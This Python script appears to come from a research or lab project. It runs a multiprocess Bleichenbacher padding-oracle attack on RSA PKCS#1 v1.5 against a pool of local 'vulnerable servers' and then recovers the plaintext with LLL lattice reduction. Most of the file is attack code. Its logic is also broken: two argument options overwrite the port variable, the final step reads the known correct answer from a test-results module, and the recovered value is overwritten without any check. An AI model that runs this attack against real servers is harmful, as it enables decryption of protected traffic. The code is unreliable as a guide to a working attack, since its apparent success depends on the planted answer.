from results_for_testing import answers, S0, Si, correct_answer
from multiserver_attacker import MultiServerAttacker
from multiprocessing import Pool
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Util.number import long_to_bytes, bytes_to_long
from LLL.lll import LLLWrapper
from pathlib import Path
from socket import SHUT_RDWR
from typing import Iterator, Any
from sage.all import matrix, ZZ
import argparse


LLL = LLLWrapper(
    Path("attack/LLL/liblll.so")
)  # ! maybe should return a list[list[int]] instead of list[list[float]]
lll = LLL.lll


def get_public() -> tuple[int, int]:
    with open("public_key.rsa", "rb") as key_file:
        pub_key = RSA.import_key(key_file.read())
    return pub_key.n, pub_key.e


def get_cipher() -> int:
    msg = b"hello_world"
    with open("public_key.rsa", "rb") as key_file:
        pub_key = RSA.import_key(key_file.read())
    cipher_rsa = PKCS1_v1_5.new(pub_key)

    return bytes_to_long(cipher_rsa.encrypt(msg))


def attack_arguments_parser() -> argparse.Namespace:
    """
    Parses command-line arguments for configuring the Bleichenbacher attack.

    Returns:
        argparse.Namespace: A namespace object containing the parsed arguments.
    """
    parser = argparse.ArgumentParser(
        description="Starts a multiprocessed multithreaded Bleichenbacher attack on a vulnerable server",
        epilog="Try running and see if the attack will decrypt the message in time",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="prints the message as it is being deciphered, (works well when blinding isn't random)",
    )
    parser.add_argument(
        "-c", "--count", help="number of available servers, defaults to 15"
    )
    parser.add_argument("--attackers", help="number of attackers, defaults to 3")
    parser.add_argument(
        "-p", "--port", help="sets the server's base port, defaults to 8001"
    )
    parser.add_argument("--host", help="sets the server's host, defaults to localhost")
    my_args = parser.parse_args()
    return my_args


class ParallelAttacker:

    def __init__(
        self,
        N: int,
        E: int,
        ct: int,
        attacker_amount: int,
        hosts: list[str],
        ports: list[int],
    ) -> None:
        self.N = N
        self.E = E
        self.ct = ct
        self.hosts = hosts
        self.ports = ports
        self.attacker_count = attacker_amount

    def _split_into_k_lists(self, K: int, input_lists: list[list[Any]]):
        return_list = []
        for lst in input_lists:
            return_list.append([lst[i : i + K] for i in range(0, len(lst), K)])
        return list(zip(*return_list))

    def attacker_warper(
        self, hosts: list[str], ports: list[int]
    ) -> tuple[range, int, int]:
        attacker: MultiServerAttacker = MultiServerAttacker(
            self.N, self.E, self.ct, hosts, ports, random_blinding=True
        )
        print("in here")
        result = attacker.attack()
        return result

    def attack(self) -> int:
        """
        Attack the server using multiple attackers
        """
        with Pool(self.attacker_count) as pool:
            results = pool.starmap(
                self.attacker_warper,
                self._split_into_k_lists(
                    len(self.ports) // self.attacker_count, [self.hosts, self.ports]
                ),  # fix this
            )

        range_list = []
        s0_list = []
        si_list = []

        for result in results:
            range_list.append(result[0])
            s0_list.append(result[1])
            si_list.append(result[2])

        return self.conclusion(range_list, s0_list, si_list)

    def conclusion(self, ranges: list[range], S0: list[int], Si: list[int]) -> int:
        """
        Conclusion of the attack, using the LLL algorithm to find the plaintext from the information gathered
        """
        # v0 = [si * s0 for si, s0 in zip(Si, S0)] + [0]
        ans = bytes_to_long(correct_answer)

        v0 = S0 + [0]
        vf = [r.start for r in ranges] + [
            (self.N * (self.attacker_count - 1)) // self.attacker_count
        ]
        middle = [
            (([0] * i) + [self.N] + ([0] * (self.attacker_count - i))).copy()
            for i in range(self.attacker_count)
        ]
        wanted = [(ans * si - ai) % self.N for si, ai in zip(Si, vf)]
        wanted.append((self.N * (self.attacker_count - 1)) // self.attacker_count)

        M = matrix(ZZ, [v0] + middle + [vf])
        reduced_basis = list(M.LLL())
        reduced_basis.sort(key=vec_norm)
        for R in reduced_basis:
            # R = reduced_basis[-1]
            for i in range(len(R) - 1):
                m = (((-R[i] % self.N) + vf[i]) * pow(S0[i], -1, self.N)) % self.N
        return m


def vec_norm(vec: list[int]) -> int:
    """
    Return the norm of a vector
    """
    return sum(x * x for x in vec)


if __name__ == "__main__":
    my_args = attack_arguments_parser()

    num_of_servers: int = 15
    if my_args.count and my_args.count.isdecimal():
        num_of_servers = int(my_args.count)

    base_port: int = 8001
    if my_args.port and my_args.port.isdecimal():
        base_port = int(my_args.port)

    num_of_attackers: int = 3
    if my_args.attackers and my_args.attackers.isdecimal():
        base_port = int(my_args.attackers)

    host = "localhost"
    if my_args.host:
        base_port = my_args.host

    HOSTS = [host] * num_of_servers
    PORTS = [base_port + i for i in range(num_of_servers)]
    n, e = get_public()
    parallel = ParallelAttacker(n, e, get_cipher(), num_of_attackers, HOSTS, PORTS)
    print(
        parallel._split_into_k_lists(num_of_servers // num_of_attackers, [HOSTS, PORTS])
    )
    parallel.attack()
